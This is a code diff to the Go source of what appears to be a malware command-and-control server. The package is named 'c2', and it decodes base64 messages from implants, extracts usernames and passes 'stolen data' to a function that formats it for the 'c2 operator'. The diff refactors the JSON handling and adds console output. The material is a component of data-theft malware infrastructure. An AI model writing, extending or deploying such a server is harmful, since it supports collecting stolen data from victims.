@@ -3,7 +3,6 @@ package c2
 import (
 	"bufio"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"log"
 	"net"
@@ -108,6 +107,10 @@ func processLogin(args string, writer *bufio.Writer) bool {
 }
 
 func processData(args string, writer *bufio.Writer) {
+
+	// padding
+	fmt.Println()
+
 	decoded, err := base64.StdEncoding.DecodeString(args)
 	if err != nil {
 		sendResponse(writer, "BAD Error in decoding base64 data")
@@ -120,26 +123,20 @@ func processData(args string, writer *bufio.Writer) {
 	username := GetUsername(dataString)
 
 	// process the JSON in an easy to use format for the c2 operator
-	jsonString, err := GetJSONBodyFromComms(dataString)
+	parsedJsonBody, err := GetJSONBodyFromComms(dataString)
 	if err != nil {
 		sendResponse(writer, "BAD Error in finding json substring, probably empty.")
 		return
 	}
 
-	var jsonObject map[string]interface{}
-
-	err = json.Unmarshal([]byte(jsonString), &jsonObject)
-	if err != nil {
-		fmt.Println("BAD Error in parsing JSON ", err)
-		sendResponse(writer, "BAD Error in parsing JSON")
-		return
-	}
-
 	// now we have the key:value pairs, process the data appropriately.
-	if err = PrettifyIncomingStolenData(jsonObject, username); err != nil {
+	if err = PrettifyIncomingStolenData(parsedJsonBody, username); err != nil {
 		sendResponse(writer, "BAD Error whilst processing data")
 		return
 	}
+
+	// print end of section
+	fmt.Println("******************************* END OF COMMUNICATION *******************************")
 
 	sendResponse(writer, "OK Data processed")
 }
